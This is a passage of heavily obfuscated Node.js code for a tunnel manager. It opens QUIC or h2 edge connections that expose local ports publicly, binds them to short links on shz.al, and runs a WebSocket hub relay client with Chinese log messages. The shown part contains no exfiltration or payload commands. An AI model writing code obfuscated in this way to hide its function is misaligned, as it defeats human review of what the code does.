            'ttIjh': function (d, f) {
                return d - f;
            },
            'OAgPk': function (d, f) {
                return d * f;
            },
            'igaWr': function (d, f) {
                return d ** f;
            }
        };
    if (b['yauIN'](a, 0x0))
        return a0cy;
    const c = Math['min'](b[l9(0xb50)](a, 0x1), 0xa);
    return Math[l9(0xb66)](b['OAgPk'](a0cy, b[l9(0xc80)](0x2, c)), a0cz);
}
function a0cB(a, b = 0x12c) {
    const la = a0d0, c = {
            'KRNwB': function (d, f) {
                return d == f;
            },
            'CtSsI': function (d, f) {
                return d(f);
            }
        };
    if (c[la(0xd41)](a, null))
        return null;
    return c[la(0x18e)](String, a)[la(0x174)](0x0, b);
}
function a0cC() {
    const lb = a0d0;
    return new Date()['toISOString']()[lb(0xde0)](/\.\d{3}Z$/, 'Z');
}
const a0cD = ((() => {
    const lc = a0d0, a = {
            'vJjcf': function (c, d, f) {
                return c(d, f);
            },
            'KahKO': function (c, d) {
                return c < d;
            },
            'SlMyd': function (c, d) {
                return c * d;
            },
            'jtAnF': function (c, d) {
                return c * d;
            }
        }, b = a[lc(0xa9a)](parseInt, process.env.KISAMA_ARGO_IDLE_TIMEOUT || '', 0xa);
    if (!Number[lc(0x3f2)](b) || a[lc(0xc03)](b, 0x0))
        return a[lc(0x463)](0x12c, 0x3e8);
    return b === 0x0 ? 0x0 : a['jtAnF'](Math['max'](b, 0xa), 0x3e8);
})());
function a0cE(a) {
    const ld = a0d0, b = {
            'sWgNJ': function (c, d) {
                return c === d;
            },
            'tpAyX': ld(0xefa),
            'ZQQuR': function (c, d) {
                return c === d;
            }
        };
    if (Buffer[ld(0x55b)](a))
        try {
            const c = JSON['parse'](a['toString'](ld(0x132)));
            return c && b['sWgNJ'](typeof c, ld(0xbfb)) ? c : {};
        } catch (d) {
            return {};
        }
    if (typeof a === b['tpAyX']) {
        const f = a['trim']();
        if (f)
            try {
                return JSON[ld(0x766)](f);
            } catch (g) {
            }
        return {};
    }
    return a && b['ZQQuR'](typeof a, ld(0xbfb)) ? a : {};
}
class a0cF {
    constructor(a) {
        const le = a0d0, b = { 'mmhEX': le(0x689) }, c = b[le(0xe4b)][le(0xc0)]('|');
        let d = 0x0;
        while (!![]) {
            switch (c[d++]) {
            case '0':
                this[le(0x638)] = a0bx;
                continue;
            case '1':
                this[le(0x8a8)] = new Map();
                continue;
            case '2':
                this[le(0x7c1)] = null;
                continue;
            case '3':
                this[le(0x8e2)] = a0bp;
                continue;
            case '4':
                this[le(0x6d3)] = a;
                continue;
            }
            break;
        }
    }
    async [a0d0(0xb96)](a, b, c = ![], d = null) {
        const lf = a0d0, f = {
                'zuSyd': function (s, t) {
                    return s + t;
                },
                'VsQrX': lf(0xa7a),
                'GxeLK': lf(0xa6),
                'uemag': lf(0xdca),
                'deTnR': function (s, t) {
                    return s(t);
                },
                'zAkGb': function (s) {
                    return s();
                },
                'jGKor': lf(0x19e),
                'TPAhB': function (s, t) {
                    return s !== t;
                },
                'nRYSU': function (s, t) {
                    return s !== t;
                },
                'cafoc': function (s, t) {
                    return s !== t;
                },
                'DVAeh': function (s, t) {
                    return s !== t;
                },
                'ZqjIX': function (s, t, u, v) {
                    return s(t, u, v);
                },
                'RHjcr': function (s, t) {
                    return s === t;
                },
                'zGhKQ': function (s, t) {
                    return s !== t;
                },
                'Fsocr': lf(0x8fe),
                'fymcy': lf(0x6e0),
                'BkixQ': function (s, t) {
                    return s(t);
                },
                'Jsezh': function (s, t) {
                    return s(t);
                },
                'ctdje': lf(0x6a3)
            }, g = d && d[lf(0xb01)] || f[lf(0x608)], h = !!(d && d[lf(0x7ba)]), i = d && f[lf(0xc33)](d['shzName'], undefined) && f[lf(0xc33)](d[lf(0xdc8)], null) ? d['shzName'] : null, j = d && f[lf(0xc33)](d[lf(0xeec)], undefined) && f[lf(0xdcd)](d['shzKey'], null) ? d[lf(0xeec)] : null, k = h || f['cafoc'](i, null) || f[lf(0x5ab)](j, null);
        if (k) {
            const s = f[lf(0xefb)](a0cO, a, i, j);
            if (s) {
                const t = new Error(s);
                t['status'] = 0x190, t[lf(0x606)] = a;
                throw t;
            }
            for (const u of this[lf(0x8a8)][lf(0x543)]()) {
                for (const v of u) {
                    if (f[lf(0x28c)](v[lf(0x606)], a) && f['zGhKQ'](v['shzName'], null)) {
                        const w = new Error(lf(0xeaa)['concat'](a, lf(0x6d4))[lf(0x7b6)](v[lf(0xdc8)], lf(0x505)));
                        w['status'] = 0x199, w[lf(0x606)] = a;
                        throw w;
                    }
                }
            }
        }
        const l = this[lf(0x8a8)][lf(0xb2b)](a) || [];
        if (l['length'] > 0x0 && !b) {
            const x = new Error(lf(0x759)[lf(0x7b6)](a, lf(0x9bf)));
            x[lf(0xab3)] = 0x199, x['port'] = a;
            throw x;
        }
        let m, n, o, p;
        try {
            [m, n, o, p] = await (this[lf(0x2db)] || a0bm)(lf(0x48a));
        } catch (y) {
            const z = new Error(f[lf(0xaec)]('failed\x20to\x20create\x20tunnel:\x20', y[lf(0xf18)]));
            z[lf(0xab3)] = 0x1f4, z['port'] = a;
            throw z;
        }
        const q = m[lf(0x46a)](f[lf(0x5db)]) ? m : f[lf(0xaec)](f[lf(0x5db)], m), r = {
                'tunnelDomain': q,
                'port': a,
                'createdAt': new Date()[lf(0xdac)]()['replace'](/\.\d{3}Z$/, 'Z'),
                'transport': c ? 'quic' : 'h2',
                'quicFailures': 0x0,
                'consecutiveFailures': 0x0,
                'status': f[lf(0x2bd)],
                'lastError': null,
                'lastErrorAt': null,
                'lastRegisteredAt': new Date()[lf(0xdac)]()[lf(0xde0)](/\.\d{3}Z$/, 'Z'),
                'source': g,
                'shzName': null,
                'shzKey': null,
                'shzKeyExplicit': ![],
                'onDomainChange': null,
                'stopped': ![],
                'sock': null,
                'conn': null,
                'runPromise': null
            };
        r[lf(0x775)] = this['_runLoop'](r, n, o, p)['catch'](A => {
            const lg = lf;
            this[lg(0x6d3)]['warning'](f[lg(0xaec)](f['VsQrX'] + q + f[lg(0x969)], A[lg(0xf18)])), !r['stopped'] && (r['status'] = f[lg(0x5f4)], r[lg(0x409)] = f[lg(0xa01)](a0cB, A && A['message'] ? A[lg(0xf18)] : A), r[lg(0xb05)] = f[lg(0x947)](a0cC));
        }), l[lf(0x59a)](r), this[lf(0x8a8)][lf(0x6e7)](a, l);
        if (k) {
            const A = i !== null ? String(i) : f[lf(0x5be)](a0cM, a), B = f['DVAeh'](j, null) ? f['BkixQ'](String, j) : f[lf(0x3d6)](a0cN, A);
            this['_applyBind'](r, A, B, j !== null), this['_persistArgobinds'](), this[lf(0xba8)](r);
        }
        return this[lf(0x6d3)]['info'](f[lf(0xaec)](f[lf(0xaec)](f[lf(0xaec)](f[lf(0xaec)](f[lf(0xaec)](f[lf(0xa87)], q), '\x20->\x20127.0.0.1:'), a), '\x20(') + r[lf(0xb54)], ')')), r;
    }
    [a0d0(0x6c8)](a, b, c, d = ![]) {
        const lh = a0d0;
        a['shzName'] = b, a['shzKey'] = c, a[lh(0x871)] = d, a['onDomainChange'] = (f, g) => {
            const li = lh;
            a0cK[li(0xe9f)](g, b, c);
        };
    }
    [a0d0(0xba8)](a) {
        const lj = a0d0;
        a0cK[lj(0xe9f)](a['tunnelDomain'], a[lj(0xdc8)], a['shzKey'])['catch'](() => {
        });
    }
    [a0d0(0xc29)]() {
        const lk = a0d0, a = {
                'jvDGS': function (c, d) {
                    return c !== d;
                }
            }, b = [];
        for (const c of this['tunnels'][lk(0x543)]()) {
            for (const d of c) {
                if (d[lk(0xdc8)] !== null) {
                    const f = {
                        'port': d[lk(0x606)],
                        'name': d[lk(0xdc8)]
                    };
                    if (a[lk(0xa89)](d[lk(0xeec)], null) && d[lk(0x871)])
                        f[lk(0xd79)] = d[lk(0xeec)];
                    b['push'](f);
                }
            }
        }
        return a0aN[lk(0xa5c)](b);
    }
    [a0d0(0xa85)](a, b, c) {
        const ll = a0d0, d = {
                'bexQv': function (g, h) {
                    return g === h;
                },
                'IVkPC': function (g, h) {
                    return g !== h;
                },
                'gedDW': function (g, h) {
                    return g === h;
                },
                'iihHU': function (g, h) {
                    return g > h;
                }
            }, f = this[ll(0x8a8)][ll(0xb2b)](a) || [];
        if (d['bexQv'](f['length'], 0x0))
            return {
                'status': 0x194,
                'message': ll(0xe1c)[ll(0x7b6)](a)
            };
        if (b !== undefined && d[ll(0xf14)](b, null) && b !== '') {
            const g = f[ll(0x74d)](h => h[ll(0x249)] === b);
            if (d[ll(0x5c3)](g[ll(0x615)], 0x0))
                return {
                    'status': 0x194,
                    'message': ll(0xe1c)['concat'](a, ll(0x962))[ll(0x7b6)](b)
                };
            return {
                'status': 'ok',
                'entry': g[0x0]
            };
        }
        if (d[ll(0x760)](f[ll(0x615)], 0x1))
            return {
                'status': 0x199,
                'message': ll(0x970)[ll(0x7b6)](a, ',\x20specify\x20tunnel_domain\x20to\x20disambiguate')
            };
        return {
            'status': 'ok',
            'entry': f[0x0]
        };
    }
    async [a0d0(0x82e)](a, b, c = null, d = null) {
        const lm = a0d0, f = {
                'ndnrU': 'bind',
                'fPRBe': function (l, m) {
                    return l !== m;
                },
                'lNaqA': function (l, m) {
                    return l === m;
                },
                'wxYpL': lm(0xdcb),
                'ghTrz': function (l, m) {
                    return l !== m;
                },
                'nrpCi': function (l, m) {
                    return l(m);
                },
                'dwxSt': function (l, m) {
                    return l(m);
                },
                'SuWPq': function (l, m) {
                    return l + m;
                },
                'jakCd': 'https://shz.al/~'
            }, g = a0cO(a, c, d);
        if (g)
            return {
                'status': 0x190,
                'message': g
            };
        const h = this[lm(0xa85)](a, b, f[lm(0x15e)]);
        if (f[lm(0xb25)](h[lm(0xab3)], 'ok'))
            return h;
        const i = h[lm(0x102)];
        if (f[lm(0x650)](i[lm(0xb01)], f[lm(0x77e)]))
            return {
                'status': 0x199,
                'message': lm(0xc3d)[lm(0x7b6)](a, lm(0xf0c))
            };
        for (const l of this['tunnels']['values']()) {
            for (const m of l) {
                if (f['fPRBe'](m, i) && m[lm(0x606)] === a && f[lm(0xb25)](m['shzName'], null))
                    return {
                        'status': 0x199,
                        'message': lm(0xeaa)[lm(0x7b6)](a, lm(0x6d4))[lm(0x7b6)](m[lm(0xdc8)], lm(0x505))
                    };
            }
        }
        const j = f[lm(0xb9)](c, null) ? f[lm(0x8bb)](String, c) : a0cM(a), k = d !== null ? f[lm(0x756)](String, d) : f['dwxSt'](a0cN, j);
        return this['_applyBind'](i, j, k, f['ghTrz'](d, null)), this[lm(0xc29)](), this['_reportBoundAsync'](i), {
            'status': 'ok',
            'bound': !![],
            'port': a,
            'tunnel_domain': i[lm(0x249)],
            'shz_name': j,
            'shz_url': f[lm(0x478)](f[lm(0x515)], j)
        };
    }
    async [a0d0(0xdcc)](a, b) {
        const ln = a0d0, c = {
                'xWiKK': function (i, j) {
                    return i !== j;
                },
                'cojOn': function (i, j) {
                    return i === j;
                }
            }, d = this[ln(0xa85)](a, b, ln(0xdcc));
        if (c[ln(0x1c2)](d[ln(0xab3)], 'ok'))
            return d;
        const f = d[ln(0x102)];
        if (c[ln(0x2da)](f[ln(0xdc8)], null))
            return {
                'status': 0x194,
                'message': 'tunnel\x20on\x20port\x20'[ln(0x7b6)](a, ln(0xbdd))
            };
        const g = f[ln(0xdc8)], h = f[ln(0xeec)];
        return f[ln(0xdc8)] = null, f[ln(0xeec)] = null, f[ln(0x871)] = ![], f['onDomainChange'] = null, this[ln(0xc29)](), a0cK[ln(0x297)](g, h)[ln(0xef4)](() => {
        }), {
            'status': 'ok',
            'bound': ![],
            'port': a,
            'tunnel_domain': f[ln(0x249)],
            'shz_name': null,
            'shz_url': null
        };
    }
    ['list']() {
        const lo = a0d0, a = {
                'KCJet': lo(0x6e0),
                'nQxdi': function (d, f) {
                    return d + f;
                },
                'bAfGj': 'https://shz.al/~'
            }, b = [], c = [...this[lo(0x8a8)][lo(0x30b)]()][lo(0xa25)]((d, f) => d - f);
        for (const d of c) {
            for (const f of this[lo(0x8a8)][lo(0xb2b)](d)) {
                b['push']({
                    'tunnel_domain': f[lo(0x249)],
                    'port': f[lo(0x606)],
                    'created_at': f['createdAt'],
                    'transport': f['transport'],
                    'status': f[lo(0xab3)] || a[lo(0xae8)],
                    'last_error': f[lo(0x409)] ?? null,
                    'last_error_at': f[lo(0xb05)] ?? null,
                    'consecutive_failures': f['consecutiveFailures'] || 0x0,
                    'last_registered_at': f[lo(0x730)] ?? null,
                    'shz_name': f[lo(0xdc8)] ?? null,
                    'shz_url': f['shzName'] ? a[lo(0xa36)](a['bAfGj'], f[lo(0xdc8)]) : null
                });
            }
        }
        return b;
    }
    async [a0d0(0xea4)](a, b) {
        const lp = a0d0, c = {
                'CXPVj': function (j, k) {
                    return j === k;
                },
                'xVoVR': function (j, k) {
                    return j === k;
                },
                'byiYU': function (j, k) {
                    return j === k;
                },
                'jvwJt': function (j, k) {
                    return j > k;
                },
                'miYsr': function (j, k) {
                    return j !== k;
                },
                'UgBbK': lp(0x77b),
                'ouuGD': function (j, k) {
                    return j !== k;
                },
                'intEE': 'alive',
                'sReuE': function (j, k) {
                    return j + k;
                },
                'xEKjT': lp(0x5ce),
                'zVWaA': function (j, k) {
                    return j > k;
                },
                'LCoht': function (j, k) {
                    return j + k;
                },
                'mXKuY': lp(0x3a7)
            }, d = this[lp(0x8a8)][lp(0xb2b)](a) || [];
        if (c[lp(0x53a)](d[lp(0x615)], 0x0))
            return {
                'status': 0x194,
                'message': lp(0xe1c)[lp(0x7b6)](a)
            };
        let f;
        if (c[lp(0x36e)](b, undefined) || c[lp(0x2e9)](b, null) || c[lp(0x53a)](b, '')) {
            if (c['jvwJt'](d[lp(0x615)], 0x1))
                return {
                    'status': 0x199,
                    'message': lp(0x970)[lp(0x7b6)](a, lp(0x4f9))
                };
            f = d;
        } else {
            f = d['filter'](j => j['tunnelDomain'] === b);
            if (f[lp(0x615)] === 0x0)
                return {
                    'status': 0x194,
                    'message': lp(0xe1c)['concat'](a, lp(0x962))['concat'](b)
                };
        }
        const g = [], h = [];
        for (const j of f) {
            j['stopped'] = !![];
            if (c[lp(0xd0b)](j[lp(0x18d)], null))
                try {
                    j[lp(0x18d)]['close'](c[lp(0x59c)]);
                } catch (l) {
                }
            if (c['ouuGD'](j[lp(0x2d0)], null))
                try {
                    j[lp(0x2d0)]['destroy']();
                } catch (m) {
                }
            await j['runPromise'][lp(0xef4)](() => {
            });
            const k = j[lp(0xdc8)];
            j[lp(0xdc8)] !== null && (h['push']([
                j[lp(0xdc8)],
                j['shzKey']
            ]), j[lp(0xdc8)] = null, j[lp(0xeec)] = null, j[lp(0x871)] = ![]), g[lp(0x59a)]({
                'tunnel_domain': j[lp(0x249)],
                'port': j[lp(0x606)],
                'created_at': j[lp(0x56d)],
                'transport': j[lp(0xb54)],
                'status': j[lp(0xab3)] || c[lp(0xe68)],
                'last_error': j[lp(0x409)] ?? null,
                'last_error_at': j[lp(0xb05)] ?? null,
                'consecutive_failures': j[lp(0x531)] || 0x0,
                'last_registered_at': j[lp(0x730)] ?? null,
                'shz_name': k,
                'shz_url': k ? c['sReuE'](c[lp(0x889)], k) : null
            });
        }
        const i = d[lp(0x74d)](n => !n[lp(0x240)]);
        c[lp(0x245)](i['length'], 0x0) ? this[lp(0x8a8)]['set'](a, i) : this[lp(0x8a8)][lp(0xcd1)](a);
        if (h[lp(0x615)] > 0x0) {
            this[lp(0xc29)]();
            for (const [n, o] of h) {
                a0cK[lp(0x297)](n, o)[lp(0xef4)](() => {
                });
            }
        }
        for (const p of g) {
            this[lp(0x6d3)][lp(0x6e3)](c[lp(0x366)](c[lp(0xc20)], p[lp(0x762)]));
        }
        return {
            'status': 'ok',
            'deleted': g[lp(0x615)],
            'tunnels': g
        };
    }
    async [a0d0(0x8d2)](a, b, c, d) {
        const lq = a0d0, f = {
                'fnyps': lq(0xf08),
                'yNNXv': function (j, k) {
                    return j !== k;
                },
                'QLkYn': function (j, k) {
                    return j(k);
                },
                'VXavL': lq(0xd97),
                'dECTi': function (j, k) {
                    return j === k;
                },
                'wSSeo': function (j, k) {
                    return j > k;
                },
                'krPHI': lq(0x77b),
                'UkWFm': function (j, k) {
                    return j % k;
                },
                'gCpsS': function (j, k) {
                    return j + k;
                },
                'dGVDD': function (j, k) {
                    return j + k;
                },
                'JzAYY': lq(0x1bc),
                'fvjOU': lq(0x24b),
                'udEwy': function (j, k) {
                    return j !== k;
                },
                'jkfAk': lq(0xdca),
                'gfoPb': 'reconnecting',
                'WDMdk': function (j) {
                    return j();
                },
                'fokTt': 'tunnel\x20closed',
                'RfLBk': function (j, k) {
                    return j !== k;
                },
                'kjoUC': lq(0xd75),
                'jnFbJ': function (j, k) {
                    return j >= k;
                },
                'BHTRY': lq(0x4ac),
                'HzDnE': function (j) {
                    return j();
                },
                'LLfEW': function (j, k) {
                    return j !== k;
                },
                'mOyPa': function (j, k) {
                    return j == k;
                },
                'QvayD': lq(0x34b),
                'apYxR': function (j, k) {
                    return j(k);
                },
                'vkgzJ': function (j, k) {
                    return j(k);
                },
                'TqoDV': function (j, k) {
                    return j(k);
                },
                'uAXpy': function (j, k) {
                    return j * k;
                }
            }, g = f[lq(0x30c)] + a[lq(0x606)], h = async j => {
                const lr = lq;
                for (let k = 0x0; k < j && !a[lr(0x240)]; k += 0x1f4) {
                    await new Promise(l => setTimeout(l, Math[lr(0xb66)](0x1f4, j - k)));
                }
            };
        a[lq(0x531)] = 0x0;
        let i = 0x0;
        while (!a['stopped']) {
            let j = null, k = null, l = null;
            try {
                const n = f[lq(0x7db)](f[lq(0x966)](String, process.env.KISAMA_EDGE_INSECURE || '')['toLowerCase'](), f[lq(0xdda)]);
                if (f[lq(0x765)](a[lq(0xb54)], lq(0xd75))) {
                    l = await a0ct(this[lq(0x6d3)], f[lq(0xb23)](a0cD, 0x0) ? a0cD : 0x7530, n);
                    if (a[lq(0x240)]) {
                        try {
                            l['close'](f['krPHI']);
                        } catch (o) {
                        }
                        break;
                    }
                    a[lq(0x18d)] = l, i = f[lq(0x8ba)](f[lq(0xd01)](i, 0x1), 0x4), await new a0cs(l, g, b, c, d, i, this[lq(0x6d3)])['run']();
                } else {
                    j = await this['_connectEdge'](n, this['log']);
                    if (a['stopped']) {
                        try {
                            j[lq(0x4d7)]();
                        } catch (p) {
                        }
                        break;
                    }
                    a[lq(0x2d0)] = j, i = f['UkWFm'](f[lq(0xd01)](i, 0x1), 0x4), k = new this[(lq(0x8e2))](j, g, b, c, d, i, this['log'], a['tunnelDomain'], ![], { 'printed': !![] }), await k[lq(0x550)]();
                }
            } catch (q) {
                if (!a[lq(0x240)]) {
                    this[lq(0x6d3)][lq(0xd62)](f[lq(0xd2c)](f[lq(0x5c0)] + a[lq(0x249)] + f[lq(0xce3)], q[lq(0xf18)]));
                    if (f[lq(0x593)](a[lq(0xab3)], f[lq(0x60e)]))
                        a[lq(0xab3)] = f['gfoPb'];
                    a[lq(0x409)] = f[lq(0x966)](a0cB, q && q[lq(0xf18)] ? q[lq(0xf18)] : q), a[lq(0xb05)] = f[lq(0xad7)](a0cC);
                }
            } finally {
                if (j !== null)
                    try {
                        j[lq(0x4d7)]();
                    } catch (r) {
                    }
                if (f[lq(0x7db)](l, null))
                    try {
                        l[lq(0xd81)](f[lq(0x738)]);
                    } catch (s) {
                    }
                a['sock'] = null, a[lq(0x18d)] = null;
            }
            if (a['stopped'])
                break;
            const m = f[lq(0x306)](k, null) && k[lq(0x175)] || f[lq(0x7db)](l, null) && l[lq(0x175)];
            if (m)
                a[lq(0x531)] = 0x0, a[lq(0x51e)] = 0x0, a[lq(0xab3)] = lq(0x6e0), a[lq(0x409)] = null, a[lq(0xb05)] = null, a[lq(0x730)] = a0cC();
            else {
                a['consecutiveFailures'] += 0x1;
                if (a[lq(0xab3)] !== f[lq(0x60e)])
                    a[lq(0xab3)] = f[lq(0x73f)];
                a[lq(0xb54)] === f[lq(0x499)] && (a[lq(0x51e)] += 0x1, f[lq(0x77f)](a[lq(0x51e)], a0cw) && (a[lq(0xb54)] = 'h2', this[lq(0x6d3)]['warning'](lq(0x1bc)[lq(0x7b6)](a['tunnelDomain'], lq(0x5cc))['concat'](a[lq(0x51e)], lq(0x3b4))), a['quicFailures'] = 0x0));
                if (f[lq(0x77f)](a[lq(0x531)], a0cw)) {
                    if (await this[lq(0x6b9)](a, (t, u, v) => {
                            b = t, c = u, d = v;
                        })) {
                        const t = f[lq(0x3cb)][lq(0xc0)]('|');
                        let u = 0x0;
                        while (!![]) {
                            switch (t[u++]) {
                            case '0':
                                a[lq(0x730)] = f['HzDnE'](a0cC);
                                continue;
                            case '1':
                                a[lq(0x51e)] = 0x0;
                                continue;
                            case '2':
                                a[lq(0xb05)] = null;
                                continue;
                            case '3':
                                a[lq(0x409)] = null;
                                continue;
                            case '4':
                                a[lq(0xab3)] = 'alive';
                                continue;
                            case '5':
                                a[lq(0x531)] = 0x0;
                                continue;
                            }
                            break;
                        }
                    } else
                        f['LLfEW'](a['status'], lq(0xdca)) && (a[lq(0xab3)] = f[lq(0x60e)], f[lq(0x7ed)](a[lq(0x409)], null) && (a[lq(0x409)] = f[lq(0xa48)], a['lastErrorAt'] = f[lq(0xcf)](a0cC))), await f['apYxR'](h, f[lq(0x81b)](a0cA, a[lq(0x531)]) * 0x3e8);
                }
            }
            !a['stopped'] && await f[lq(0xb22)](h, f[lq(0x60a)](a[lq(0x531)] > 0x0 ? f[lq(0x966)](a0cA, a['consecutiveFailures']) : a0cu, 0x3e8));
        }
    }
    [a0d0(0x6b9)](a, b) {
        const ls = a0d0, c = {
                'amOFb': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'uNcIg': ls(0x8fe),
                'eviDV': function (f, g) {
                    return f + g;
                },
                'GtrGJ': function (f, g) {
                    return f + g;
                },
                'pVcWP': ls(0xe7d),
                'sMIzi': function (f, g) {
                    return f === g;
                },
                'EGval': ls(0x6c3),
                'kagZG': function (f, g) {
                    return f === g;
                },
                'IVird': function (f, g, h) {
                    return f(g, h);
                },
                'JAePg': function (f, g) {
                    return f(g);
                },
                'EeJXL': ls(0x48a)
            }, d = this[ls(0x2db)] || a0bm;
        return c['JAePg'](d, c[ls(0xbb6)])[ls(0x9f0)](([f, g, h, i]) => {
            const lt = ls, j = a[lt(0x249)];
            c[lt(0x8dd)](b, g, h, i), a['tunnelDomain'] = f[lt(0x46a)](c[lt(0xb6c)]) ? f : c[lt(0x7e1)](c[lt(0xb6c)], f), this[lt(0x6d3)]['warning'](c[lt(0xda1)](lt(0x45d) + j + c[lt(0x39c)], a[lt(0x249)]));
            const k = c[lt(0x6c6)](typeof a[lt(0x7c1)], c[lt(0x429)]) ? a[lt(0x7c1)] : this[lt(0x7c1)];
            if (c[lt(0x8e7)](typeof k, lt(0x6c3)))
                try {
                    c['IVird'](k, j, a['tunnelDomain']);
                } catch (l) {
                }
            return !![];
        })[ls(0xef4)](f => {
            const lu = ls;
            return this[lu(0x6d3)][lu(0xd62)](lu(0xc63) + f[lu(0xf18)]), ![];
        });
    }
}
const a0cG = require('ws');
class a0cH {
    constructor(a, b, c, d, f, g = a0d0(0x67d)) {
        const lv = a0d0, h = {
                'SzrBz': function (j, k) {
                    return j || k;
                },
                'fqOUA': function (j, k, l) {
                    return j(k, l);
                },
                'QfhCl': function (j, k) {
                    return j(k);
                },
                'AAVxC': function (j, k) {
                    return j(k);
                },
                'cBAnL': 'reconnecting',
                'OliQT': function (j, k) {
                    return j * k;
                }
            };
        this['hubUrl'] = h['SzrBz'](a, '')[lv(0x27f)]()[lv(0xde0)](/\/+$/, ''), this[lv(0x973)] = (b || '')[lv(0x27f)]()[lv(0x777)](), this[lv(0x606)] = h[lv(0x9ee)](parseInt, c, 0xa), this[lv(0x7f0)] = Array['isArray'](d) ? [...d] : h[lv(0xe79)](a0a6, d), this[lv(0xb01)] = g, this[lv(0x6d3)] = f || a0R;
        const i = h['AAVxC'](a0a9, a0ax[lv(0xacc)]);
        i ? (this[lv(0x6d3)][lv(0x9cd)](lv(0x2c5)[lv(0x7b6)](i, ',\x20回退\x20KHUB\x20派生基址上报')), this[lv(0xa19)] = null) : this[lv(0xa19)] = (a0ax['KHUB_PUBLIC_URL'] || '')[lv(0x27f)]()['replace'](/\/+$/, '') || null, this['relayUrl'] = ''[lv(0x7b6)](this[lv(0xa19)] || this['hubUrl'], '/')[lv(0x7b6)](this[lv(0x973)]), this[lv(0xab3)] = h[lv(0xe44)], this[lv(0x409)] = null, this['lastErrorAt'] = null, this['consecutiveFailures'] = 0x0, this[lv(0xce4)] = null, this[lv(0x87e)] = 0x0, this[lv(0x5c7)] = null, this['_pingInterval'] = h[lv(0xb69)](Math[lv(0x8b4)](0x5, a0ax[lv(0xe39)]), 0x3e8), this['_retryBase'] = Math['max'](0.5, a0ax[lv(0x82b)]), this[lv(0x67c)] = Math[lv(0x8b4)](this['_retryBase'], a0ax[lv(0xcbf)]), this[lv(0xc0d)] = h[lv(0xb69)](Math['max'](0x5, a0ax[lv(0xed0)]), 0x3e8), this[lv(0x825)] = Math[lv(0x8b4)](0x1, a0ax['KISAMA_HUB_MAX_BODY']), this['_wsFactory'] = null, this['_request'] = null, this['_stopFlag'] = ![], this[lv(0xe88)] = null, this[lv(0x8de)] = null;
    }
    [a0d0(0x235)]() {
        const lw = a0d0;
        return {
            'tunnel_status': this['status'],
            'source': this['source'],
            'hub': this[lw(0x29a)],
            'kname': this[lw(0x973)],
            'url': this[lw(0x4f3)],
            'public_url': this[lw(0xa19)] || this['hubUrl'],
            'ports': [...this[lw(0x7f0)]][lw(0xa25)]((c, d) => c - d),
            'consecutive_failures': this[lw(0x531)],
            'last_error': this[lw(0x409)],
            'last_error_at': this[lw(0xb05)],
            'last_connected_at': this['lastConnectedAt'],
            'relay_count': this[lw(0x87e)]
        };
    }
    ['waitConnected'](a = 0x3a98) {
        const lx = a0d0, b = {
                'yqYIU': function (d, f) {
                    return d(f);
                },
                'JumBU': lx(0x30a),
                'zXQpz': function (d, f) {
                    return d(f);
                },
                'IDFGp': function (d, f) {
                    return d === f;
                },
                'VRFXL': lx(0x6e0),
                'FemQH': function (d, f) {
                    return d >= f;
                },
                'DYPef': lx(0xdfd),
                'Njjlv': function (d, f) {
                    return d + f;
                }
            }, c = b['Njjlv'](Date[lx(0x430)](), Math[lx(0x8b4)](0x3e8, a));
        return new Promise(d => {
            const lz = lx, f = {
                    'ARDRR': function (h, i) {
                        const ly = a0b;
                        return b[ly(0x24e)](h, i);
                    },
                    'VXaYm': b[lz(0xb6e)],
                    'zQfht': function (h, i) {
                        const lA = lz;
                        return b[lA(0x847)](h, i);
                    },
                    'gLXGf': function (h, i) {
                        const lB = lz;
                        return b[lB(0x402)](h, i);
                    },
                    'nsXOK': b[lz(0x820)],
                    'Misql': function (h, i) {
                        const lC = lz;
                        return b[lC(0xc6e)](h, i);
                    },
                    'xvrtr': function (h, i) {
                        return h(i);
                    },
                    'vymQT': b[lz(0x93b)]
                }, g = setInterval(() => {
                    const lD = lz;
                    if (this['_stopFlag'])
                        return clearInterval(g), f['ARDRR'](d, {
                            'ok': ![],
                            'err': new Error(f[lD(0x1ff)])
                        });
                    if (this[lD(0x5c7)])
                        return clearInterval(g), f[lD(0xc2b)](d, {
                            'ok': ![],
                            'err': this[lD(0x5c7)]
                        });
                    if (f[lD(0x408)](this[lD(0xab3)], f['nsXOK']))
                        return clearInterval(g), d({
                            'ok': !![],
                            'err': null
                        });
                    if (f['Misql'](Date[lD(0x430)](), c))
                        return f['ARDRR'](clearInterval, g), f[lD(0x6b5)](d, {
                            'ok': ![],
                            'err': new Error(f[lD(0x845)])
                        });
                }, 0xc8);
        });
    }
    [a0d0(0x4f8)](a) {
        const lE = a0d0, b = { 'Qdgfb': lE(0x3ee) };
        this[lE(0x531)] += 0x1, this[lE(0xab3)] = b['Qdgfb'], this['lastError'] = String(a && a['message'] || a)[lE(0x174)](0x0, 0x12c), this[lE(0xb05)] = a0av();
    }
    ['_backoff']() {
        const lF = a0d0, a = {
                'xruFQ': function (b, c, d, f) {
                    return b(c, d, f);
                }
            };
        return a[lF(0x63f)](a0au, this[lF(0x531)], this['_retryBase'], this[lF(0x67c)]);
    }
    [a0d0(0xb58)]() {
        const lG = a0d0;
        if (this[lG(0x8de)])
            return;
        this[lG(0xb5b)] = ![], this[lG(0x8de)] = this[lG(0x771)]()['catch'](() => {
        });
    }
    [a0d0(0x7ef)]() {
        const lH = a0d0;
        this[lH(0xb5b)] = !![];
        if (this['_hubWs']) {
            try {
                this['_hubWs'][lH(0xd81)](0x3e8, lH(0xb12));
            } catch (a) {
            }
            this[lH(0xe88)] = null;
        }
    }
    ['_send'](a) {
        const lI = a0d0, b = this[lI(0xe88)];
        if (b && b[lI(0x37e)] === a0cG[lI(0xa42)])
            try {
                b[lI(0xb36)](JSON[lI(0xbbe)](a));
            } catch (c) {
            }
    }
    async [a0d0(0x771)]() {
        const lJ = a0d0, a = {
                'CHkEw': function (b, c) {
                    return b instanceof c;
                },
                'WEUYt': function (b, c) {
                    return b * c;
                }
            };
        while (!this[lJ(0xb5b)]) {
            try {
                await this[lJ(0x733)]();
            } catch (c) {
                this[lJ(0x4f8)](c), this[lJ(0x5c7)] = a['CHkEw'](c, a0aw) ? c : null;
            }
            if (this[lJ(0xb5b)])
                break;
            const b = this[lJ(0x42d)]();
            this[lJ(0x6d3)][lJ(0xd62)]('[KMODE3]\x20⚠️\x20隧道断开\x20('[lJ(0x7b6)](this[lJ(0x409)], lJ(0x5fa))[lJ(0x7b6)](Math[lJ(0x7f3)](b), 's\x20后第\x20')[lJ(0x7b6)](this[lJ(0x531)], lJ(0xd1e))), await this[lJ(0xdbd)](a[lJ(0x241)](b, 0x3e8));
        }
